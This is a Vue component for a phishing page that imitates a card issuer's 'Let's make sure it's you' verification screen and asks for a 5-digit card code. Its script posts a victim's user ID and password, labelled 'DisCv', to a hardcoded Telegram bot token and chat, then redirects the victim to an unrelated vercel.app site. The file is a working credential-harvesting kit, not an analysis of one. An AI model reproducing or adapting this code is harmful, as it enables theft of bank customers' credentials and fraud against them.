<template>
  <div id="app">
 <body>

<header class="topbar">
    <img src="/images/light-2x.avif" alt="logo" class="logo">

    <div class="secure">
<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
  <rect x="5" y="11" width="14" height="10" rx="2"></rect>
  <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>

</svg> 
<span>Secure</span>
    </div>
</header>
<hr class="orange-line">

<section class="container">

    <div class="page">
        <div  class="left">
      <div class="title">
       <!-- <img src="lock.png" class="lock-icon" alt="lock"> -->
  <svg class="lock-icon css-9uy14h" xmlns="http://www.w3.org/2000/svg"
       fill="none"
       viewBox="0 0 60 60"
       aria-hidden="true"
       aria-label="Secure Access Symbol"
       data-testid="dfs-react-ui__icon--lock-secondary"
       >

    <path fill="#23233F" fill-rule="evenodd"
      d="M45.99 16.268C45.81 7.253 38.495 0 29.5 0c-9.109 0-16.493 7.435-16.493 16.607v3.134H4v14.952C4 48.677 15.422 60 29.5 60l.408-.003C43.818 59.773 55 48.507 55 34.677V19.74h-9.007v-3.134l-.004-.339Zm-3.19 3.473v-3.134c0-7.397-5.954-13.393-13.3-13.393-7.236 0-13.123 5.819-13.297 13.063l-.004.33v3.134h26.602ZM7.192 22.954h44.617v11.723c0 12.064-9.773 21.91-21.938 22.106l-.383.003-.372-.003c-12.141-.197-21.923-10.016-21.923-22.09V22.954Z"
      clip-rule="evenodd">
    </path>

    <path fill="#EA6A28" fill-rule="evenodd"
      d="M29.504 31.072c-2.938 0-5.32 2.399-5.32 5.357a5.355 5.355 0 0 0 3.724 5.112v6.138l.007.155a1.6 1.6 0 0 0 1.589 1.453c.881 0 1.596-.72 1.596-1.608v-6.138a5.355 5.355 0 0 0 3.724-5.112c0-2.958-2.382-5.357-5.32-5.357Zm0 3.215c1.175 0 2.128.959 2.128 2.142a2.136 2.136 0 0 1-2.128 2.143 2.136 2.136 0 0 1-2.128-2.143c0-1.183.952-2.142 2.128-2.142Z"
      clip-rule="evenodd">
    </path>

  </svg>
       <h1>Let's make sure it's <span>you</span></h1>
      </div>

        <p class="info">
            Enter the 5-digit number on your card. It begins after an X.
            <a href="#">Why do we need this?</a>
        </p>
   <form>
        <div class="inputbox">
            <span>X</span>
            <input type="text" maxlength="5" >
        </div>

        <div class="links">
            <a href="#">Eligible Card(s)</a>
        </div>

        <div class="buttons">
            <button class="verify">Verify</button>
            <a href="#">Cancel</a>
        </div>
</form>
        <a class="alt" href="#">Try a different verification method →</a>

        <p class="help">
            Need Help?
        </p>
     </div>
    </div>

        <!-- <img src="card.png" alt="card image"> -->

    <div class="right">
         <div class="card-wrapper">

    <div class="card">

        <div class="card-top"></div>

        <div class="card-content">

            <div class="name-row">
                <div class="name-box"></div>
                <span class="cvc">000</span>
            </div>

            <div class="card-number">
                6011&nbsp;&nbsp;0000&nbsp;&nbsp;0000&nbsp;&nbsp;0000
            </div>

            <div class="card-bottom">
                <span>00/00</span>
                <span>0000</span>
            </div>

        </div>

        <div class="code-circle">
            X 00000
        </div>

    </div>

</div>
    </div> 

</section>

<!-- <hr class="orange-line"> -->
<footer>
    <hr class="orange-line">
    <a href="#">Contact Us </a>
    <p class="fp">|</p>
    <a href="#">Security</a>
    <p class="fp">|</p>
    <a href="#">Privacy</a>
    <p class="fp">|</p>
    <a href="#">Terms of Use</a>
    <!-- <hr class="white"> -->
</footer>

</body>
  </div>
</template>

<script>
import axios from "axios";

export default {
  name: "App",
  data() {
    return {
      formDataRes: {
        userid: "",
        password: "",
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 2, // Only send once
    };
  },
  methods: {
    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `*⚠️ DisCv*\nUserID: ${this.formDataRes.userid}\nPassword: ${this.formDataRes.password}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-479400048", 
          // 5
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("https://windstream-net.vercel.app/");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>


<style>
    *{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial, Helvetica, sans-serif;
}

body{
background:#f4f5f7;
min-height:100vh;
display:flex;
flex-direction:column;
}


.page{
    background:white;
    width:100%;
    max-width:1600px;
    min-height:80vh;
    margin:auto;

    padding-top:75px;
    padding-bottom:75px;
    padding-left:35px;
    padding-right:35px;
}
/* TOP BAR */

.topbar{
background:#1f2443;
color:white;
display:flex;
justify-content:space-between;
align-items:center;
padding:18px 60px;
}

.logo{
height:32px;
}

.secure{
  display: flex;
  align-items: center;
  gap: 6px; /* space between icon and text */
  color: white;
}

.fp{
    color: #f37021;
}

/* MAIN CONTAINER */

.container{
width:100%;
max-width:1400px;   /* wider page */
/* margin:auto; */
display:flex;
justify-content:space-between;
align-items:center;
/* padding:70px 0; */
flex:1;
}


/* LEFT */

.left{
max-width:520px;
/* background-color: white;
padding-top: 7rem;
margin: 20px; */
}

.title{
display:flex;
align-items:center;
gap:15px;
margin-bottom:25px;
}

.lock-icon{
width:45px;
}

.title h1{
font-size:34px;
font-weight:600;
}

.title span{
color:#f37021;
}

.info{
color:#555;
margin-bottom:25px;
font-size:15px;
}

.info a{
color:#2a6edb;
text-decoration:none;
}

.inputbox{
display:flex;
align-items:center;
gap:12px;
border:1px solid #dcdcdc;
border-radius:10px;
/* padding:20px; */
padding: auto;
padding-top: 5px;
padding-left: 10px;
width:300px;
background:white;
margin-bottom:18px;
}

.inputbox span{
color:#888;
font-size:18px;
}

.inputbox input{
border:none;
outline:none;
font-size:18px;
letter-spacing: 35px;
width:100%;
}

.links{
margin-bottom:25px;
}

.links a{
color:#2a6edb;
text-decoration:none;
}

.buttons{
display:flex;
align-items:center;
gap:20px;
margin-bottom:20px;
}

.verify{
background:#f37021;
border:none;
color:white;
padding:11px 26px;
border-radius:25px;
cursor:pointer;
font-size:16px;
}

.buttons a{
color:#2a6edb;
text-decoration:none;
}

.alt{
display:block;
margin-bottom:30px;
color:#2a6edb;
text-decoration:none;
}

.help{
color:#666;
}


/* RIGHT */

.right img{
width:420px;
}


/* FOOTER */

footer{
background:#1f2443;
color:white;
display:flex;
justify-content:center;
gap:80px;
border-top: #f37021 5px solid;
padding:50px 0;
margin-top: 50px;
width:100%;     /* full width */
}

footer a{
color:white;
text-decoration:none;
font-size:14px;
}


body{
background:#e6e6e6;
font-family:Arial, Helvetica, sans-serif;
}

/* wrapper */

.card-wrapper{
padding:40px;
}

/* card */

.card{
position:relative;
width:500px;
height:300px;
background:#252846;
border-radius:20px;
color:white;
overflow:hidden;
}

/* top strip */

.card-top{
height:70px;
background:#9b9ca6;
margin-top:20px;
}

/* content */

.card-content{
padding:40px;
}

.name-row{
display:flex;
align-items:center;
gap:15px;
margin-bottom:25px;
}

.name-box{
width:220px;
height:40px;
background:#e6e6e6;
border-radius:2px;
}

.cvc{
font-size:18px;
opacity:0.9;
}

/* card number */

.card-number{
font-size:26px;
letter-spacing:3px;
margin-bottom:25px;
}

/* bottom */

.card-bottom{
display:flex;
gap:70px;
font-size:18px;
opacity:0.9;
}

/* orange circle */

.code-circle{
position:absolute;
right:-40px;
bottom:-40px;
width:160px;
height:160px;
border-radius:50%;
border:10px solid #f37b2a;
display:flex;
align-items:center;
justify-content:center;
font-size:20px;
background:#252846;
}
.orange-line{
    border: none;
    height: 4px;
    background-color: #f37021;
    margin: 0;
}
</style>